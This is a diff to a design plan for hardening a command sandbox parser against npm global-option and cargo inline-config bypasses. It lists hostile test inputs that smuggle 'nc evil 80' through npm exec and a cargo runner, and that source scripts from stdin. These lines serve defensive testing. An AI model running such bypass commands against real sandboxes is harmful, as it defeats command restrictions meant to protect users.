@@ -97,6 +97,47 @@ pass; `ruff check` and `ruff format --check` on both files.
 
 `### Security` bullet under `## [Unreleased]` in `CHANGELOG.md`.
 
+### Step 4 — review fix: npm global options, cargo inline config (deviation)
+
+Added after review of PR #1806. `_unwrap_npm` looked for the first `exec`/`x`
+word but `npm -w x exec -c 'nc evil 80'` matched the `-w` value `x` and
+checked the wrong words, and `npm --prefix x exec -c '…'` was not checked as
+exec, so both returned only `['npm']`. `cargo --config
+'target.x.runner="nc evil 80"' test` sets a runner inline.
+
+File: `apps/backend/security/ast_parser.py`.
+
+- `_unwrap_npm`: walk from `idx + 1`, `_require_literal` on each word up to
+  and including the subcommand. Skip global flags from a new
+  `_NPM_GLOBAL_FLAGS` (`-g`, `--global`, `-s`, `--silent`, `-q`, `--quiet`,
+  `-d`, `--verbose`, `-y`, `--yes`, `-ws`, `--workspaces`,
+  `--include-workspace-root`, `-v`, `--version`, `-h`, `--help`) and global
+  options with a value from a new `_NPM_GLOBAL_VALUE_OPTS` (`-w`,
+  `--workspace`, `--prefix`, `--loglevel`, `--registry`), each with its
+  argument (the next word, or after `=`). `--` ends options. Any other word
+  starting with `-` before the subcommand raises `UnparseableCommand`. The
+  first non-option word is the subcommand; if it is `exec` or `x`, call
+  `_check_package_runner(words, k + 1)`.
+- `_unwrap_cargo`: for each `--config <v>` / `--config=<v>` anywhere after
+  `cargo`, require a static literal value matching `[\w./-]+\.toml`
+  (a config file path); anything else (inline `KEY=VALUE`) raises.
+
+Tests (`tests/test_command_sandbox.py`): add to `DYNAMIC_COMMAND_WORD`
+`npm -w x exec -c 'nc evil 80'`, `npm --prefix x exec -c 'nc evil 80'`,
+`npm --workspace=x x --call nc`, `npm --bogus exec -c nc`,
+`cargo --config 'target.x.runner="nc evil 80"' test`,
+`cargo test --config=build.rustc=nc`; add to `MUST_PARSE`
+`npm -w x exec --yes -- tsc`, `npm --prefix web run build`, `npm test`,
+`cargo --config ci.toml test`.
+From the #1800 review, also add to `DYNAMIC_COMMAND_WORD`
+`source /dev/stdin <<< 'GIT_DIR=x'; git status`, `source <(cat f)`,
+`. /dev/fd/0`, `source /proc/self/fd/0`; the existing `_STDIN_SCRIPT` check
+and `_require_literal` (process substitution) already refuse them, so no
+code change.
+
+Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`;
+`ruff check`, `ruff format --check`.
+
 ## Rollback
 
 Revert the fix commit; the tests commit goes with it.
